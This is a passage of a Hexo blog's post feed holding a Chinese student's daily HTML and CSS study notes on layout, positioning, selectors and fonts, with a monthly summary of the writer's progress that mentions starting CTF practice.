href="#折行与行间距" class="headerlink" title="折行与行间距"></a>折行与行间距</h4><p>flex-wrap:wrap;                #打开折行<br>align-content:flex-start;      #折行之后的行间距<br>flex-start,flex-end,center,space-around,space-between同上</p><h2 id="至此，HTML与CSS结束！"><a href="#至此，HTML与CSS结束！" class="headerlink" title="至此，HTML与CSS结束！"></a>至此，HTML与CSS结束！</h2><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句:"></a>每日一句:</h5><p>&nbsp;&nbsp;每一个问题都想给出回答，也有一些想说的，想劝的，想帮的，但想到自己的生活也是一地鸡毛。<br>「我们每个人都把自己活得一团糟，却总以为可以指导别人过得更好。」<br>&nbsp;&nbsp;但说回来还是一句用烦了的话，提升自己是解决一切问题的方式，亲情爱情友情都是，在现在这个世界里，经济独立财富自由能解决百分之九十的烦恼，很现实也很真实，我文化不高总觉得词不达意，慢慢来捱过去总会越来越好的，到达谷底的人怎么走都是向上的</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>202210月总结</title>
      <link href="/2022/10/31/b-13/"/>
      <url>/2022/10/31/b-13/</url>
      
        <content type="html"><![CDATA[<p>好久没更新了<br>不是不想写，而是真的没时间写。<br>因为大学牲……</p><p>——————————卑微的分割线——————————</p><p>首先简述一下过去一个月的收获<br>1.当然是搭建了这个HexoBlog啦！！！虽然有人吐槽简陋而且没有服务器，但是这终归是我自己搭建的我所喜欢的博客。<br>  所以，请不要随意评论我的Blog哦~~<br>2.简简单单地学习了HTML和CSS，大概能够手搓一个非常非常简单的前端页面了<br>3.入门了CTF，这也是我这一个月所有忙活的目标。<br>  在这一个月里，经过无数次的磕磕碰碰，付出了无数的精力后，从一个完完全全的小白蜕变成了能够自己觅食寻找出路的初学者<br>4.参加了各种各样的社团面试和活动，每天都安排得满满的真的很累</p><p>然后再说一下未来的目标<br>1.肯定是继续学习前端JS还有后端PHP<br>2.写题啥的先放一下，因为靠写题来学习知识效率太低了<br>3.努力学好高数和线代……(希望)<br>4希望能够加入方班预备班？？？不是，咋我刚写下来就发通知通过了？？？</p><p>最后唠嗑两句<br>想结果的花，都早早低头;时人不识凌云木，直待凌云始道高。</p><p>—————————还是卑微的分割线—————————</p><p>附:<br>欢迎来看看我的<a href="https://gitmind.cn/app/doc/48spll2fph">笔记</a> ——&gt; 问题很多所以就看个乐子，保质期一个月<br><em><strong>嗯，没错，已经失效了</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221020</title>
      <link href="/2022/10/20/b-12/"/>
      <url>/2022/10/20/b-12/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><p>用a链接跳转到不同区域</p><pre><code>&lt;a href=&quot;#lianjie&quot;&gt;内容&lt;/a&gt;&lt;div id=&quot;a&quot;&gt;    内容&lt;/div&gt;点击a链接时跳到div中去</code></pre><h3 id="精灵图-图片整合技术"><a href="#精灵图-图片整合技术" class="headerlink" title="精灵图(图片整合技术)"></a>精灵图(图片整合技术)</h3><p>1.先将所有图片和为一个图<br>2.使用background-position来移动位置显示出</p><h3 id="宽高自适应"><a href="#宽高自适应" class="headerlink" title="宽高自适应"></a>宽高自适应</h3><p>定义:元素自动调整大小<br>1.定义宽高时为auto，元素的量决定宽高<br>2.min-height:10px;最小10px，多于10px就变大<br>问题:父元素不写高度时，子元素写了浮动，父元素会高度塌陷<br>1.声明<br>overflow:hidden;<br>2.浮动元素下加块元素并声明<br>clear:both; height:0; overflow:hidden;<br>3.清除浮动<br>after{content:””,clear:both; display:block; height:0; visibility:hidden;/overflow:hidden;}</p><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><pre><code>div::first-letter&#123;          #定义第一个字符的样式    font-size:30px;    color:red;&#125;div::first-line&#123;&#125;           #定义第一行的样式div::after&#123;content:内容&#125;    #放在对象后的内容div::before&#123;content:内容&#125;   #放在对象前的内容</code></pre><h3 id="注意-隐藏的区别"><a href="#注意-隐藏的区别" class="headerlink" title="注意(隐藏的区别)"></a>注意(隐藏的区别)</h3><p>display:none(不占位)<br>visibility:hidden(占位)</p><h3 id="窗口自适应"><a href="#窗口自适应" class="headerlink" title="窗口自适应"></a>窗口自适应</h3><pre><code>1.单一栏目html,body&#123;    height:100%;             #所有盒子根据窗口的大小变化&#125;2.两栏布局(A)使用盒子的外边距&lt;style&gt;    .box1&#123;        height:100%;        ...        margin-left:200px;     #使一个盒子空出空间(外边距)    &#125;    .box2&#123;        height:100%;        ...        float:left;            #另一个盒子往另一边靠    &#125;&lt;/style&gt;(B)使用clac()函数计算长度值注意:可以使用加减乘除，而且运算符号前后都要加一个空格&lt;style&gt;    .box1&#123;        height:100%;        width:clac(100% - 200px);     #根据屏幕窗口的变化而改变        float:left;     &#125;    .box2&#123;        height:100%;        width:100px;         float:left;     &#125;&lt;/style&gt;3.三栏布局(A)1.先html,body&#123;&#125;全部统一变化2.left和right浮动3.center设置左右外边距4.先让左右浮动再插入center(B)同上，要在center加入clac函数</code></pre><h5 id="表单进阶"><a href="#表单进阶" class="headerlink" title="表单进阶"></a>表单进阶</h5><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><pre><code>&lt;body&gt;    &lt;div&gt;性别&lt;/div&gt;                                        #定义标题    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;            #radio是选框样式，name是一个组，id表示标记        &lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;                       #label是说明标签，for是定位到上面的id    &lt;/div&gt;    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;woman&quot;&gt;        &lt;label for=&quot;woman&quot;&gt;女&lt;/label&gt;    &lt;/div&gt;&lt;/body&gt;注意:1.如果没有定义name(组)会变成多选2.如果要默认选中，在input中加上checked=&quot;checked&quot;，也可以直接写checked</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人不该惧怕孤独，因为出生前，造物主就用孤独考验过每个人，哪里还能比在胚胎中更孤独呢？</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221019</title>
      <link href="/2022/10/19/b-11/"/>
      <url>/2022/10/19/b-11/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><pre><code>1.默认值position:static;2.绝对定位position:absolute;top:100px;left:-20px;脱离原始位置,但是原始位置占位，参照物是父元素或浏览器第一屏(没有父元素时)注:通常与相对定位相结合使用3.相对定位position:relative;top:100px;left:-20px;不脱离原始位置，但是原始位置不占位(类似于浮动),相对于原始位置4.固定定位position:fixed;top:100px;left:-20px;脱离原始位置，固定在浏览器窗口5.粘性定位position:sticky;top:0px;吸顶效果，需要定义距离边框的距离，css3.0新增附加:透明度&lt;style&gt;    p&#123;        opacity:0;        #0是完全透明，1是不透明    &#125;&lt;/style&gt;</code></pre><h3 id="三角形模型"><a href="#三角形模型" class="headerlink" title="三角形模型"></a>三角形模型</h3><pre><code>.box&#123;                                          #标准style    width:0px;                                 #定义盒子模型基本属性    height:0px;    border:20px solid transparent;             #四周全部透明    border-bottom:20px solid red;              #单边不透明，重合部分五五分显示颜色，这样子可以显示为三角形    position:relative;                         #相对盒子模型定位    bottom:2.5px;                              #移动至中间(美观)&#125;.box:hover span&#123;                               #悬浮时的style    width:0px;    height:0px;    border:20px solid transparent;    border-top:20px solid red;    position:relative;    top:2.5px;&#125;</code></pre><h3 id="定位的层级"><a href="#定位的层级" class="headerlink" title="定位的层级"></a>定位的层级</h3><p>父子关系时<br>z-index越大越靠上显示</p><h3 id="绝对定位深入探索"><a href="#绝对定位深入探索" class="headerlink" title="绝对定位深入探索"></a>绝对定位深入探索</h3><p>1.<br>兄弟关系时，后来者居上，后面的再上层<br>2.<br>行内元素转化为块元素<br>绝对定位法:定义absolute</p><pre><code>    &lt;style&gt;        span&#123;            width:            ...            poosition:absolute;        &#125;    &lt;/style&gt;&lt;body&gt;    &lt;span&gt;        内容    &lt;/span&gt;&lt;/body&gt;直接转化法:display:block;浮动法:float:left;</code></pre><h3 id="水平垂直居中"><a href="#水平垂直居中" class="headerlink" title="水平垂直居中"></a>水平垂直居中</h3><p>1.先定义absolute<br>2.设定宽高位置50%<br>3.移动-px至中间<br>4.注意是相对于哪个盒子</p><h3 id="定位与浮动的区别"><a href="#定位与浮动的区别" class="headerlink" title="定位与浮动的区别"></a>定位与浮动的区别</h3><p>有文字时:<br>浮动半脱离(文字环绕效果)<br>abslote全脱离(无环绕效果)</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>想结果的花， 都早早低头。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221018</title>
      <link href="/2022/10/18/b-10/"/>
      <url>/2022/10/18/b-10/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="溢出属性"><a href="#溢出属性" class="headerlink" title="溢出属性"></a>溢出属性</h3><p>overflow:visible全部显示,hidden不显示溢出的,scroll滑动一直存在,auto自动<br>overflow:inherit继承父元素的效果<br>单一方向显示<br>overflow-x:auto;<br>overflow-y:hidden;<br>一定要定义x和y</p><h3 id="空余空间"><a href="#空余空间" class="headerlink" title="空余空间"></a>空余空间</h3><pre><code>white-space:normal;        #normal无视空白，nowrap不换行直到br标签，pre，pre-wrap,pre-linepre标签是预格式化文本，保留空格tab回车pre保留空白，pre-wrap折行但是保留空白，pre-line保留空白不换行</code></pre><h3 id="溢出省略号"><a href="#溢出省略号" class="headerlink" title="溢出省略号"></a>溢出省略号</h3><pre><code>width:2000px;                     #一定要定义宽度white-space:nowrap;               #不换行overflow:hidden;                  #隐藏溢出的部分text-overflow:ellipsis;           #若溢出则在最后显示省略号</code></pre><h3 id="元素显示类型"><a href="#元素显示类型" class="headerlink" title="元素显示类型"></a>元素显示类型</h3><p>1.块元素(display:block或list-item)<br>例:p,div,h标签<br>A）块状元素在网页中就是以块的形式显示，快状就是元素显示为矩形区域，<br>B）默认情况下，块状元素都会占据一行，会按顺序自上而下排列。<br>C）块状元素都可以定义自己的宽度和高度<br>D）块状元素一般都作为其他元素的容器，它可以容纳其它内联元素和其它块状元素。<br>E）p标签只能放文本不能放块级元素（div等）<br>2.行内(内联)元素(display:inline)<br>例:a,b,em,i,span,strong标签<br>A）在同一行排列<br>B）无法设置宽高，只能默认<br>3.行内块元素(display:inline-block)<br>例:img,input标签<br>A）可以设置宽高<br>B）同行排列</p><p>注意<br>span行内元素只支持左右边距，不支持上下边距<br>行内块支持</p><h3 id="元素类型相互转换"><a href="#元素类型相互转换" class="headerlink" title="元素类型相互转换"></a>元素类型相互转换</h3><p>直接在style里display:block;进行转换</p><h3 id="设置鼠标悬浮时显示，否则隐藏"><a href="#设置鼠标悬浮时显示，否则隐藏" class="headerlink" title="设置鼠标悬浮时显示，否则隐藏"></a>设置鼠标悬浮时显示，否则隐藏</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .hide&#123;                      #隐藏界面(不显示内容)            display:none;        &#125;        .box:hover ul&#123;              #在hover时显示块元素(block是原本的style)            display:block;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;hide&quot;&gt;        111111111111    &lt;/div&gt;    &lt;div class=&quot;box&quot;&gt;        内容1        &lt;ul class=&quot;hide&quot;&gt;            &lt;li&gt;11111&lt;/li&gt;            &lt;li&gt;22222&lt;/li&gt;            &lt;li&gt;33333&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="二级菜单案例《重点》"><a href="#二级菜单案例《重点》" class="headerlink" title="二级菜单案例《重点》"></a>二级菜单案例《重点》</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            padding:0;                       #先对整个页面布局            margin:0;        &#125;        .box&#123;            width:300px;            margin:0 auto;        &#125;        ul&#123;                                  #不悬浮时不显示            list-style:none;        &#125;        .box .item&#123;            float:left;            width:148px;                     #前面提到的要减去boder的宽度，因为计算的是加上boder的            text-align:center;            border:1px solid blue;            background:blue;            color:white;            line-height:40px;        &#125;        .item:hover&#123;            color:lightblue;        &#125;        .item&gt;ul&#123;                            # &gt;是选择器，选择子代的而不会选择到父代的ul标签            display:none;            background:white;            color:black;        &#125;        .item:hover ul&#123;                      #hover时恢复原本的块元素属性            display:block;        &#125;        .item li:hover&#123;                      #注意是hover在谁的时候显示变化            color:blue;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class=&quot;box&quot;&gt;        &lt;li class=&quot;item&quot;&gt;aaaaaaaaaaaa        #第一个一级菜单            &lt;ul&gt;                &lt;li&gt;111&lt;/li&gt;                &lt;li&gt;222&lt;/li&gt;                 #第一个二级菜单                &lt;li&gt;333&lt;/li&gt;                &lt;li&gt;444&lt;/li&gt;            &lt;/ul&gt;        &lt;/li&gt;        &lt;li class=&quot;item&quot;&gt;bbbbbbbbbbbb        #第二个一级菜单            &lt;ul&gt;                &lt;li&gt;pmp&lt;/li&gt;                &lt;li&gt;红帽&lt;/li&gt;                #第二个二级菜单            &lt;/ul&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h5><p>1.有几个模块就方济各div标签(header，导航nav，list，footer)<br>2.一定要注意减去宽度<br>3.共同的属性发放在一起成为标签，如宽度<br>4.为了美观和简单布局，建议引入css文件</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221016</title>
      <link href="/2022/10/16/b-9/"/>
      <url>/2022/10/16/b-9/</url>
      
        <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><pre><code>1.外边距    &lt;style&gt;        div&#123;            padding:30px;               /* 一个值4个方向一样，两个值上下和左右，三个值上和左右和下，四个值上右下左 */            padding-left:0px;           /* 对单一方向更改 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;        111111111111111111    &lt;/div&gt;&lt;/body&gt;注意:1.上下两个box时外边距取大值2.左右两个box加和3.有父子两个box时，子盒子加外边距会整体移动解决:1.加浮动  2.overflow:hidden.2.边框&lt;style&gt;    .box1&#123;        border-top:10px dotted red;             #solid实线double双实线dashed虚线dotted点状线，可以选择单一方向更改        margin:10px auto;                       #用法同上，左边是纵向，右边是横向，auto是居中    &#125;&lt;/style&gt;注意:实际上的编写会有3px的误差，来源于图片标签的图片和文字间类型不同，需要转换:img&#123;    display:block;&#125;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221014</title>
      <link href="/2022/10/14/b-8/"/>
      <url>/2022/10/14/b-8/</url>
      
        <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="列表属性-在列表前加元素"><a href="#列表属性-在列表前加元素" class="headerlink" title="列表属性(在列表前加元素)"></a>列表属性(在列表前加元素)</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;ul&#123;        list-style-type:none;                    /* disc实心圆 circle空心圆 square实心正方形 none无 */        list-style-image:url(地址);              /* 这样子是全部都使用这种style的，否则要在li前加class */        list-style-position: outside;            /* outside把上面的元素放在盒子外面，inside放在里面 */        &#125;        .p1&#123;            list-style:none url(地址) inside;    /* 复合属性写法 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul&gt;        &lt;li class=&quot;p1&quot;&gt;            内容        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h3><p>用法和字体颜色一样</p><pre><code>在style下对标签定义width,height,background-color:rgba(255,0,0,0.5)    #rgba是透明对于插入的图片:background-image: url(地址);                                     #默认平铺，图片太大裁剪，太小复制background-repeat: repeat;                                       #repeat默认，repeat-x是x轴平铺，repeat-y是y轴平铺，no-repeat不平铺background-position:10px 10%;                                    #图片放置的位置，左边是横向右边是纵向，%是相对于盒子的background-position:right center;                                #左边是横向右边是纵向background-size:400px 100%;                                      #左边是横向右边是纵向(会失真)，cover(完全覆盖但是可能无法全部显示)，contain(图片全部展示但是会留白)background-attachment: fixed;                                    #fixed固定在浏览器视窗内，scroll滚动，如果没有div会不显示复合写法background:   ;不看顺序注意:background-size要单独放</code></pre><h3 id="浮动属性"><a href="#浮动属性" class="headerlink" title="浮动属性"></a>浮动属性</h3><pre><code>float:left;         #并排靠左排列，太多换行float:right;        #和左对称浮动的会覆盖未浮动的(因为float的没有高度)文字不能被挡住，放在上层防止高度塌陷(防止覆盖)1.div内固定高度，令其有高度2.清浮动clear:left/right/both/none3.当前浮动元素后补一个盒子，不设置宽高，clear:both4.overflow:hidden;(使浮动元素计算高度)</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人，归根结底，是一个物质存在，很容易受损伤，却不容易修复。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221012</title>
      <link href="/2022/10/12/b-7/"/>
      <url>/2022/10/12/b-7/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><pre><code>font-size        字体大小     单位是px，浏览器默认是16px,设计图常用字号是12pxfont-family      字体         当字体是中文字体、英文字体中有空格时，需加双引号                               多个字体中间用逗号链接,先解析第1个字体,如果没有解析第2个字体，以此类推 color            颜色         color:red;color:#ff0；color:rgb(255,0,0)；0-255 font-weight      加粗         font-weight:bolder(更粗的)/bold（加粗）/normal（常规）                               font-weight:100-900；100-500不加粗 600-900加粗 font-style       倾斜         font-style:italic(斜体字)/oblique(oblique倾斜的文字)/normal（常规显示）；text-align       文本水平对齐  text-align: left;       水平靠左                              text-align：right;     水平靠右                               text-align：cente;     水平居中                               text-align: justify;    水平2端对齐，但是只对多行起作用text-transform   单词大小写    uppercase全部大写,lowercase全部小写,none无定义,capitalize首字母大写样例&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .p1&#123;            font-size:13px;        &#125;        .p2&#123;            font-family:宋体,等等等;    #逗号间隔，从左到右依次使用        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;p class=&quot;p1 p2&quot;&gt;        内容    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>字体总结:<br>宋体 SimSun<br>黑体 SimHei<br>微软雅黑 Microsoft YaHei<br>微软正黑体 Microsoft JhengHei<br>新宋体 NSimSun<br>新细明体 PMingLiU<br>细明体 MingLiU<br>标楷体 DFKai-SB<br>仿宋 FangSong<br>楷体 KaiTi<br>仿宋 _GB2312 FangSong_GB2312<br>楷体 _GB2312 KaiTi_GB2312</p><h3 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h3><p>1.<br>color:rgb(255,0,0)<br>0最弱255最强<br>2.<br>十六进制0<del>9，A</del>F<br>color:ffffff    #每两个对应上面的一组，0是最弱f是最强，相同的可以只写一次</p><h3 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h3><pre><code>line-height          行高        line-height的数据=height的数据，可以实现单行文本垂直居中 text-indent          首行缩进    text-indent可以取负值； text-indent属性只对第一行起作用 letter-spacing       字间距      控制文字和文字之间的间距 text-decoration      文本修饰    text-decoration:  none没有/underline下划线/overline上划线/line-through删除线 font                 文字简写    font是font-style  font-weight font-size/line-height font-family的简写。                                 font:italic 800 30px/80px&quot;宋体”;   注意！！！对于font————顺序不能改变,必须同时指定font-size和font-family属性时才起作用</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>问什么有时候比答什么更能表露说话人的心。————张北海</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221008和09</title>
      <link href="/2022/10/09/b-6/"/>
      <url>/2022/10/09/b-6/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>1.含义:如何修饰网页信息的显示样式<br>2.语法<br> 1）每个CSS样式由两部分组成，即选择符和声明，声明又分为属性和属性值。<br> 2）属性必须放在花括号中，属性与属性值用冒号连接。<br> 3）每条声明用分号结束。<br> 4）当一个属性有多个属性值的时候，属性值与属性值不分先后顺序，用空格隔开。<br> 5）在书写样式过程中，空格、换行等</p><h2 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h2><pre><code>第一&lt;style&gt;    h1&#123;color:red;&#125;&lt;/style&gt;放head和body都可以第二&lt;body&gt;    &lt;h1 style=&quot;color:red;&quot; &gt;内容&lt;/h1&gt;&lt;/body&gt;</code></pre><h2 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h2><pre><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; herf=&quot;css文件所在的地址&quot;&gt;       #注意是rel&lt;style&gt;    @import url(css文件所在的地址);                                    #注意分号&lt;style&gt;两种，最好放head标签里</code></pre><h2 id="扩展知识点"><a href="#扩展知识点" class="headerlink" title="扩展知识点"></a>扩展知识点</h2><p>link和import之间的区别？<br>①差别1：本质的差别：link属于XHTML标签，而@import完全是CSS提供的一种方式。<br>②差别2：加载顺序的差别：link引用的CSS会同时被加载，而@import引用的CSS会等到页面全部被下载完再被加载。所以有时候浏览@import加载 CSS的页面时开始会没有样式（就是闪烁），网速慢的时候还挺明显。<br>③差别3：兼容性的差别：@import老的浏览器不支持，而link标签无此问题。<br>样式表优先级<br>原则:就近原则————!important（放在属性值后）&gt;行内&gt;内部&gt;外部           #注意感叹号</p><h3 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h3><p>1.class类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .类名1&#123;background-color:blue;&#125;                              #就近原则，离开头最近的style为准        .类名2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;类名1 类名2&quot;&gt;222&lt;/div&gt;                              #空格可以放置多个类名&lt;/body&gt;&lt;/html&gt;</code></pre><p>2.id选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        #box1&#123;background-color:yellow;&#125;        #box3&#123;background-color:blue;&#125;        #box2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：#id名&#123;属性：属性值;&#125; A）使用id选择符时，应该为每个元素定义一个id属性 如：&lt;divid=&quot;box&quot;&gt;&lt;/div&gt; B）id选择符的语法格式是“#”加上自定义的id名 如：#box&#123;width:300px;height:300px;&#125; C）起名时要取英文名，不能用关键字：（所有的标记和属性都是关键字） 如：head标记 D）一个id名称只能对应文档中一个具体的元素对象,多个时就不显示样式。（唯一性）</code></pre><p>3.通配符选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            margin:0;      #外边距为0            padding:0;     #内边距为0        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：*&#123;属性:属性值;&#125; 说明：通配选择符的写法是“*”，其含义就是所有元素。 *&#123;margin:0;padding:0;&#125;代表清除所有元素的默认边距值和填充值</code></pre><p>4.群组与后代选择器</p><pre><code>    &lt;style&gt;        标签们或者class内的类名们&#123;background-color:yellow&#125;      #标签们之间要加逗号，而且类名前要加.    &lt;/style&gt;若之间不加逗号则是后代选择器，仅更改空格代表的后代#从右到左地选择</code></pre><p>5.伪类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        a:link&#123;color:yellow;&#125;        a:visited&#123;color:red;&#125;        a:hover&#123;color:orange;&#125;        a:active&#123;color:blue;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;超链接&quot;&gt;        内容    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;语法： a：link&#123;属性：属性值;&#125;超链接的初始状态 a.visited(属性：属性值;&#125;超链接被访问后的状态 a:hovert&#123;属性：属性值;&#125;鼠标悬停的状态 a:active&#123;属性：属性值;&#125;超链接被激活时的状态说明： A）顺序为： a:link,a:visited,a:hover,a:active,错误的顺序有时会使超链接的样式失效 